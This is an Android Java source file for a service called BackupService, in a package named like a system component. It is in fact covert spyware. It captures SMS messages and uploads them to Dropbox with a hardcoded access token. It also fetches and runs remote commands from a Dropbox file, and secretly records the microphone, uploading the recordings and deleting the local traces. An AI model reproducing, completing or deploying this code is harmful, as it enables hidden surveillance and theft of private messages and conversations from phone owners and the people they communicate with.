package com.android.commstat.services;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.util.Log;

import com.android.commstat.AudioRecorder;
import com.android.commstat.IOUtils;
import com.android.commstat.model.CommandSettings;
import com.android.commstat.model.Sms;
import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class BackupService extends IntentService {

    public static final String SMS = "sms";
    public static final String SEND_FILES = "send_files";
    public static final String RECORD_MIC = "record_mic";
    public static final String EXTRA_FILES_FOLDER = "files_folder";
    public static final String RECORDS_FOLDER = "records";
    public static final String COMMAND_EXTRA = "command";
    public static final String CHECK_COMMAND = "commstat.permission.CHECK_COMMAND";

    private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
    private static final String MESSAGES_FOLDER = "messages";
    private static List<String> mSendingDirs = new ArrayList<>(1);

    private final ArrayList<Sms> mMessages = new ArrayList<>();
    private boolean mIsBusy;

    public BackupService() {
        super(BackupService.class.getName());
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent == null || intent.getExtras() == null) {
            return;
        }
        if(TextUtils.equals(intent.getAction(), SMS)) {
            Object messageObj = intent.getExtras().getSerializable(SMS);
            if (messageObj != null) {
                if (messageObj instanceof Sms) {
                    synchronized (mMessages) {
                        mMessages.add((Sms) messageObj);
                    }
                    startQueue();
                }
            }
        } else if(TextUtils.equals(intent.getAction(), SEND_FILES)) {
            String filesFolder = intent.getStringExtra(EXTRA_FILES_FOLDER);
            if(filesFolder != null) {
                sendFiles(filesFolder);
            }
        } if(TextUtils.equals(intent.getAction(), CHECK_COMMAND)) {
            checkCommands();
        }
    }

    private void checkCommands() {
        final String commandsFileName = "commands.txt";
        DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
        ListFolderResult result = null;
        Metadata commandsFileMetadata = null;
        try {
            result = client.files().listFolder("");
            while (true) {
                for (Metadata metadata : result.getEntries()) {
                    if (TextUtils.equals(metadata.getName(), commandsFileName)) {
                        commandsFileMetadata = metadata;
                        break;
                    }
                }
                if (!result.getHasMore()) {
                    break;
                }
                result = client.files().listFolderContinue(result.getCursor());
            }
        } catch (DbxException e) {
            e.printStackTrace();
            return;
        }
        if (commandsFileMetadata == null) {
            return;
        }
        OutputStream os = null;
        File commandsFile = new File(getFilesDir().getAbsolutePath(), commandsFileName);
        try {
            os = new FileOutputStream(commandsFile);
            client.files().downloadBuilder(commandsFileMetadata.getPathDisplay()).download(os);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(os);
        }
        try {
            client.files().delete(commandsFileMetadata.getPathDisplay());
        } catch (DbxException e) {
            e.printStackTrace();
        }
        if(!commandsFile.exists()) {
            return;
        }
        FileInputStream is = null;
        try {
            is = new FileInputStream(commandsFile.getAbsolutePath());
            InputStreamReader inputreader = new InputStreamReader(is);
            BufferedReader buffreader = new BufferedReader(inputreader);
            String line;
            try
            {
                while ((line = buffreader.readLine()) != null) {
                    execCommand(line);
                }
            }catch (Exception e)
            {
                e.printStackTrace();
            } finally {
                IOUtils.closeQuietly(buffreader);
                IOUtils.closeQuietly(inputreader);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(is);
        }
        if(commandsFile.exists()) {
            commandsFile.delete();
        }
    }

    private void execCommand(String command) {
        CommandSettings commandSettings = new CommandSettings(command);
        if(commandSettings.getCommandType() == null) {
            return;
        }
        switch (commandSettings.getCommandType()) {
            case RecordAudio:
                recordMic(commandSettings);
                break;
            case RecordLocation:
                break;
        }
    }

    private void recordMic(CommandSettings command) {
        if(command == null) {
            return;
        }
        if(command.getDuration() == 0 && command.getTotalDuration() == 0) {
            return;
        }
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.MILLISECOND, command.getTotalDuration());
        FinishListener listener = new FinishListener(calendar.getTime(), command.getDelay(), command.getDuration(), command.getTotalDuration());
        new RecordTask(command.getDuration() == 0 ? command.getTotalDuration() : command.getDuration(), listener).start();
    }

    class FinishListener implements OnFinishListener {
        private final Date mFinishTime;
        private final int mDelay;
        private final int mDuration;
        private final int mTotalDuration;

        FinishListener(Date finishTime, int delay, int duration, int totalDuration) {
            mFinishTime = finishTime;
            mDelay = delay;
            mDuration = duration;
            mTotalDuration = totalDuration;
        }

        @Override
        public void onFinish() {
            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.MILLISECOND, mDelay);
            calendar.add(Calendar.MILLISECOND, mDuration);
            if(mFinishTime.getTime() > calendar.getTime().getTime()) {
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        new RecordTask(mDuration <= 0 ? mTotalDuration : mDuration, FinishListener.this).start();
                    }
                }, mDelay);
            }
        }
    }

    interface OnFinishListener {
        void onFinish();
    }

    class RecordTask {
        private AudioRecorder mRecorder;
        private long mDuration;
        private Timer mStopTimer;
        private boolean mIsStop;
        private OnFinishListener mOnFinishListener;
        private String mFilePath;

        RecordTask(long duration, OnFinishListener onFinishListener) {
            mFilePath = makeFilePath(BackupService.this, RECORDS_FOLDER);
            mRecorder = new AudioRecorder(mFilePath);
            mDuration = duration;
            mOnFinishListener = onFinishListener;
        }

        void start() {
            mIsStop = false;
            mRecorder.start();
            mStopTimer = new Timer();
            mStopTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    stop();
                    if(mOnFinishListener != null) {
                        mOnFinishListener.onFinish();
                        sendFiles(new File(mFilePath).getParentFile().getAbsolutePath());
                    }
                }
            }, mDuration);
        }

        void stop() {
            if(mStopTimer != null) {
                mStopTimer.cancel();
                mStopTimer.purge();
                mStopTimer = null;
            }
            if(!mIsStop) {
                mIsStop = true;
                mRecorder.stop();
            }
        }
    }

    public String makeFilePath(Context context, String folderName) {
        File recordsDir = new File(context.getFilesDir().getAbsolutePath(), folderName);
        if (!recordsDir.exists() && !recordsDir.mkdir()) {
            return null;
        }
        String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + ".3gp";
        File file = new File(recordsDir, fileName);
        return file.getAbsolutePath();
    }

    private void startQueue() {
        if(mIsBusy) {
            return;
        }
        mIsBusy = true;
        boolean isBreak = false;
        while (mMessages.size() > 0) {
            final Sms sms;
            synchronized (mMessages) {
                sms = mMessages.remove(0);
            }
            try {
                sendMessage(sms);
            } catch (Exception e) {
                e.printStackTrace();
                Timer timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        synchronized (mMessages) {
                            mMessages.add(sms);
                        }
                        mIsBusy = false;
                        startQueue();
                    }
                }, 5000);
                isBreak = true;
                break;
            }
        }
        if(!isBreak) {
            mIsBusy = false;
        }
    }

    private void sendFiles(final String directoryPath) {
        if(mSendingDirs.contains(directoryPath)) {
            return;
        }
        File dir = new File(directoryPath);
        if(!dir.exists()) {
            return;
        }
        String dirName = dir.getName();
        mSendingDirs.add(directoryPath);
        try {
            for (File innerFile : dir.listFiles()) {
                DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
                ListFolderResult result = client.files().listFolder("");
                Metadata dbFolder = null;
                while (true) {
                    for (Metadata metadata : result.getEntries()) {
                        if (TextUtils.equals(metadata.getName(), dirName)) {
                            dbFolder = metadata;
                            break;
                        }
                    }
                    if (!result.getHasMore()) {
                        break;
                    }
                    result = client.files().listFolderContinue(result.getCursor());
                }
                if (dbFolder == null) {
                    client.files().createFolder("/" + dirName);
                }
                InputStream is = null;
                try {
                    is = new FileInputStream(innerFile);
                    client.files().uploadBuilder("/" + dirName + "/" + innerFile.getName())
                            .withMode(WriteMode.ADD)
                            .uploadAndFinish(is);
                    innerFile.delete();
                } finally {
                    IOUtils.closeQuietly(is);
                }
            }
            mSendingDirs.remove(directoryPath);
        } catch (Exception ex) {
            ex.printStackTrace();
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    mSendingDirs.remove(directoryPath);
                    sendFiles(directoryPath);
                }
            }, 10000);
        }
    }

    private void sendMessage(final Sms message) throws Exception {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            Log.d("Permission exception", "Permission WRITE_EXTERNAL_STORAGE is not granted");
            return;
        }
        final String fileName = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(message.getDate().getTime()) + ".txt";
        File file = getMessageFile(fileName);
        if(file == null) {
            return;
        }
        if(!message.isWrite()) {
            FileWriter writer = null;
            try {
                writer = new FileWriter(file, true);
                writer.append(message.toString()).append("\r\n");
                message.setIsWrite(true);
            } finally {
                IOUtils.closeQuietly(writer);
            }
        }
        DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
        ListFolderResult result = client.files().listFolder("");
        Metadata messagesFolder = null;
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), MESSAGES_FOLDER)) {
                    messagesFolder = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }

        if(messagesFolder == null) {
            messagesFolder = client.files().createFolder("/" + MESSAGES_FOLDER);
        }
        Metadata messagesFile = null;
        result = client.files().listFolder(messagesFolder.getPathDisplay());
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), fileName)) {
                    messagesFile = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }
        /*if(messagesFile != null && file.length() == 0) {
            OutputStream os = null;
            try {
                os = new FileOutputStream(file);
                client.files().downloadBuilder(messagesFile.getPathDisplay()).download(os);
            } finally {
                IOUtils.closeQuietly(os);
            }
        }*/
        InputStream is = null;
        try {
            is = new FileInputStream(file);
            client.files().uploadBuilder("/" + MESSAGES_FOLDER + "/" + file.getName())
                    .withMode(messagesFile != null ? WriteMode.OVERWRITE : WriteMode.ADD)
                    .uploadAndFinish(is);
        } finally {
            IOUtils.closeQuietly(is);
        }
    }

    private File getMessageFile(final String fileName) {
        File messageDir = new File(getFilesDir().getAbsolutePath(), MESSAGES_FOLDER);
        if (!messageDir.exists() && !messageDir.mkdir()) {
            return null;
        }
        File file = new File(messageDir, fileName);
        try {
            if (!file.exists() && !file.createNewFile()) {
                return null;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return file;
    }

}
